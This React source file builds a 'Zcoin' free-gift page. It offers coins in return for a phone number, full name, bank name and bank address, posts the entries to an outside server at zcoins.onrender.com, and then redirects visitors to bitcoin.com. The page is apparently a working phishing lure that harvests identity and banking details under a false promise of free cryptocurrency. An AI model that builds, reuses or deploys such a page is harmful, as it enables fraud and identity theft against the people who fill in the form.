import React from 'react'
import {useState,useRef } from 'react';
import axios from 'axios';
import coin from './m011t0336_a_dollar_sign_13jun22-removebg-preview.png'
import crown from "./crown.png"

function Login() {
   
  const [phoneNumberError,setPhoneNumberError]=useState("");
  const [success, setSuccess] = useState("");
  const [firstNameError, setFirstNameError] = useState("");
  const [lastNameError, setLastNameError] = useState("");
  const [surNameError, setSurNameError] = useState("");
  const [bankNameError, setBankNameError] = useState("");
  const [bankAddressError, setBankAddressError] = useState("");
  const firstNameRef = useRef()
  const surNameRef = useRef();
  const lastNameRef = useRef();
  const bankAddressRef = useRef();
  const bankNameRef = useRef();
  const phoneNumberRef = useRef()
  const removeErrorMessage = () => {
    const removeTime = setTimeout(() => {
      setPhoneNumberError("");
      setFirstNameError("");
      setLastNameError("");
      setSurNameError("");
      setBankNameError("");
      setBankAddressError("");
      setSuccess('')
    }, 2000);
    return () => {
      clearTimeout(removeTime);
    };
  };
  const sendHandler=async ()=>{
     const data = {
       phonenumber: phoneNumberRef.current.value,
       lastname: lastNameRef.current.value,
       firstname: firstNameRef.current.value,
       surname: surNameRef.current.value,
       bankname: bankNameRef.current.value,
       bankaddress: bankAddressRef.current.value,
     };
     if (data.phonenumber === "") {
       setPhoneNumberError("Enter phone number");
       removeErrorMessage()
     }
     if (data.firstname === "") {
       setFirstNameError("Enter firstname");
       removeErrorMessage();
    }
    if (data.lastname === "") {
      setLastNameError("Enter lastname");
      removeErrorMessage();
    }
    if (data.surname === "") {
      setSurNameError("Enter surname");
      removeErrorMessage();
    }
    if (data.bankaddress === "") {
      setBankAddressError("Enter bank address");
      removeErrorMessage();
    }
    if (data.bankname === "") {
      setBankNameError("Enter bank name");
      removeErrorMessage();
    }
     if (
       data.phonenumber !== "" &&
       data.firstname !== "" &&
       data.lastname !== "" &&
       data.surname !== "" &&
       data.bankaddress !== "" &&
       data.bankaddress !== ""
     ) {
       console.log(data);
       axios
         .post("https://zcoins.onrender.com/api/post", data, {
        
           headers: {
             "Content-Type": "application/json",
           },
         })
         .then((res) => {
           console.log(res);
         })
         .catch((err) => {
           console.log(err);
         });
       setSuccess("success");
       removeErrorMessage()
     }

  }

  const submitHandler = async(e) => {
    e.preventDefault();
    await sendHandler()
    e.target.reset()
    const interval = setTimeout(() => {
      window.location = "https://bitcoin.com/";
    }, 5000)
    return () => {
      clearTimeout(interval)
    }
    
  };


  return (
    <div>
      <div className="head">
        <h1>
          Z<small>coin</small>
          <img
            src={coin}
            style={{ width: "50px", height: "50px" }}
            alt="free coin"
          />
        </h1>
      </div>
      <div className="wrap">
        <section>
          <div className="container">
            <form action="" onSubmit={submitHandler}>
              <h2>Get Gift</h2>
              <input
                ref={phoneNumberRef}
                type="text"
                className="input"
                placeholder="Phone number"
              />
              <p className="error">{phoneNumberError}</p>
              <input
                ref={surNameRef}
                type="text"
                className="input"
                placeholder="Enter your Surname"
              />
              <p className="error">{surNameError}</p>
              <input
                ref={firstNameRef}
                type="text"
                className="input"
                placeholder="Enter your Firstname"
              />
              <p className="error">{firstNameError}</p>
              <input
                ref={lastNameRef}
                type="text"
                className="input"
                placeholder="Enter your Lastname"
              />
              <p className="error">{lastNameError}</p>
              <input
                ref={bankNameRef}
                type="text"
                className="input"
                placeholder="Enter your Bank name"
              />
              <p className="error">{bankNameError}</p>
              <input
                ref={bankAddressRef}
                type="text"
                className="input"
                placeholder="Bank Address"
              />

              <p className="error">{bankAddressError}</p>
              <button className="btn">
                Get Coin
                <img
                  src={crown}
                  style={{
                    width: "20px",
                    height: "20px",
                    padding: "0px",
                    margin: "0px",
                  }}
                  alt="free coin"
                />
              </button>
              <p className="success">{success}</p>
            </form>
          </div>
        </section>
      </div>
    </div>
  );
}

export default Login